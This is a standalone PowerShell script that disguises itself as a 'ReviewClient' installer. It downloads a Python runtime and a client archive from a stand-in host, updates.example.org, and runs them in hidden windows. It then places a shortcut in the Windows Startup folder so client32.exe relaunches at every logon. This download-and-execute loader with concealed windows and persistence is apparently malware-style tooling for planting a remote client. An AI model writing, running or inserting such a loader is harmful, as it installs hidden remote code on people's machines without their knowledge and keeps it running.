$root = Join-Path $env:APPDATA 'ReviewClient'
New-Item -ItemType Directory -Force $root | Out-Null
Invoke-WebRequest 'http://updates.example.org/python.zip' -OutFile "$root\python.zip"
Expand-Archive "$root\python.zip" "$root\runtime" -Force
$script = @'
import urllib.request, zipfile
urllib.request.urlretrieve('http://updates.example.org/client.zip', 'client.zip')
with zipfile.ZipFile('client.zip') as archive:
    archive.extractall('client')
'@
Set-Content "$root\install.py" $script
Start-Process "$root\runtime\python.exe" -ArgumentList "$root\install.py" -WindowStyle Hidden -Wait -WorkingDirectory $root
$ws = New-Object -ComObject WScript.Shell
$link = $ws.CreateShortcut((Join-Path ([Environment]::GetFolderPath('Startup')) 'ReviewClient.lnk'))
$link.TargetPath = "$root\client\client32.exe"
$link.WindowStyle = 7
$link.Save()
Start-Process "$root\client\client32.exe" -WindowStyle Hidden
